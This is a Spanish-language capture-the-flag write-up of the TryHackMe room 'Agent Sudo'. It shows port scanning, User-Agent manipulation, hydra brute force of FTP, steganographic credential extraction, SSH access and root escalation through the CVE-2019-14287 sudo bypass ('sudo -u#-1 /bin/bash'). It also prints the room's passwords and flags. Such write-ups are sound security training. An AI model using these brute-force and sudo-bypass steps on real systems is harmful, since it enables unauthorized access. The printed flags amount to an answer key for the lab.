# Agent Sudo — TryHackMe

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=flat)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=flat)
![Status](https://img.shields.io/badge/Status-Completed-blue?style=flat)
![CVE](https://img.shields.io/badge/CVE-2019--14287-orange?style=flat)

> **Fecha:** 25/04/2025
> **Autor:** [Josue Rendón](https://github.com/Slasho01)
> **Room:** [Agent Sudo](https://tryhackme.com/room/agentsudoctf)

---

## 📋 Descripción

Room de dificultad fácil que cubre enumeración web mediante manipulación de User-Agent HTTP, fuerza bruta de servicios FTP, esteganografía en imágenes y escalada de privilegios explotando **CVE-2019-14287** en sudo.

---

## 🎯 Objetivos

- [x] ¿Cuántos puertos abiertos hay?
- [x] ¿Cómo redirigirte a la página secreta?
- [x] Contraseña FTP
- [x] Contraseña del archivo ZIP
- [x] Contraseña de steghide
- [x] ¿Quién es el otro agente? (nombre completo)
- [x] Contraseña SSH
- [x] Flag de usuario
- [x] Flag de root

---

## 🔍 1. Reconocimiento

### Escaneo de puertos

```bash
nmap -sC -sV <TARGET_IP>
```

**Resultado:**
```
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

**Puertos relevantes:**
- `21` — FTP, posible acceso con credenciales
- `22` — SSH, objetivo final de acceso
- `80` — HTTP, punto de entrada inicial

**Puertos abiertos: 3**

---

## 🌐 2. Enumeración

### Enumeración Web

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

**Resultado:**
```
/.hta                 (Status: 403)
/.htpasswd            (Status: 403)
/.htaccess            (Status: 403)
/index.php            (Status: 200)
/server-status        (Status: 403)
```

La página principal muestra el siguiente mensaje:

```
Dear agents,
Use your own codename as user-agent to access the site.
From, Agent R
```

> Los agentes se identifican con letras. Probando cada letra como User-Agent con curl encontramos al agente C:

```bash
curl -L -A "C" http://<TARGET_IP>/
```

**Respuesta:**
```
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP.
Also, change your god damn password, is weak!

From, Agent R
```

**Usuario identificado:** `chris`

---

## 💥 3. Explotación

### 3.1 Fuerza bruta FTP

Con el usuario `chris` confirmado, se realiza ataque de fuerza bruta sobre el servicio FTP:

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ftp
```

**Credenciales obtenidas:** `chris:crystal`

### 3.2 Acceso FTP y descarga de archivos

```bash
ftp <TARGET_IP>
# User: chris
# Password: crystal
mget *
```

**Archivos descargados:**
```
To_agentJ.txt
cute-alien.jpg
cutie.png
```

**Contenido de `To_agentJ.txt`:**
```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside
your directory. Your login password is somehow stored in the fake picture.

From, Agent C
```

### 3.3 Esteganografía — cutie.png

Se extrae contenido oculto de la imagen con foremost (binwalk presentó error de compatibilidad):

```bash
foremost -i cutie.png -o output/
```

**Archivo extraído:** `00000067.zip`

Se crackea el ZIP con john:

```bash
zip2john 00000067.zip > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Contraseña ZIP:** `alien`

**Contenido de `To_agentR.txt`:**
```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By, Agent R
```

El string `QXJlYTUx` está codificado en **Base64**:

```bash
echo "QXJlYTUx" | base64 -d
# Output: Area51
```

**Passphrase steghide:** `Area51`

### 3.4 Esteganografía — cute-alien.jpg

```bash
steghide extract -sf cute-alien.jpg
# Passphrase: Area51
```

**Contenido de `message.txt`:**
```
Hi james,

Glad you find this message. Your login password is hackerrules!

Your buddy, chris
```

**Credenciales SSH obtenidas:** `james:hackerrules!`

### 3.5 Acceso SSH

```bash
ssh james@<TARGET_IP>
```

---

## 🚩 4. Flags

### Flag de usuario

```bash
cat /home/james/user_flag.txt
```

```
b03d975e8c92a7c04146cfa7a5a313c7
```

---

## ⬆️ 5. Escalada de privilegios — CVE-2019-14287

### Enumeración de sudo

```bash
sudo -l
```

```
User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

```bash
sudo --version
# Sudo version 1.8.21p2
```

### Vulnerabilidad identificada

> **CVE-2019-14287** — Sudo Security Policy Bypass
>
> Afecta versiones de sudo **anteriores a 1.8.28**. La configuración `(ALL, !root)` está diseñada para impedir ejecutar comandos como root, pero pasar el UID `-1` hace que sudo lo interprete como UID `0` (root), bypasseando la restricción.

### Explotación

```bash
sudo -u#-1 /bin/bash
whoami
# root
```

### Flag de root

```bash
cat /root/root.txt
```

```
b53a02f55b57d4439e3341834d70c062
```

---

## 📝 6. Lecciones aprendidas

- Los headers HTTP como **User-Agent** pueden usarse como mecanismo de control de acceso — siempre vale la pena manipularlos durante la enumeración web
- La **esteganografía** permite ocultar información en imágenes de aspecto normal — herramientas como steghide y foremost son esenciales
- Los strings en **Base64** son fácilmente identificables por sus caracteres y el `=` al final
- La configuración `(ALL, !root)` en sudoers **no es suficiente** para restringir acceso root en versiones vulnerables de sudo
- Siempre verificar la **versión exacta** de sudo y compararla con CVEs conocidos

---

## 🔗 Referencias

- [CVE-2019-14287](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287)
- [GTFOBins — bash](https://gtfobins.github.io/gtfobins/bash/)
- [CyberChef — Base64 decoder](https://gchq.github.io/CyberChef/)
- [HackTricks — Steganography](https://book.hacktricks.xyz/)

---

*Write-up por [Josue Rendón](https://github.com/Slasho01) · [TryHackMe Profile](https://tryhackme.com/p/Slasho01)*
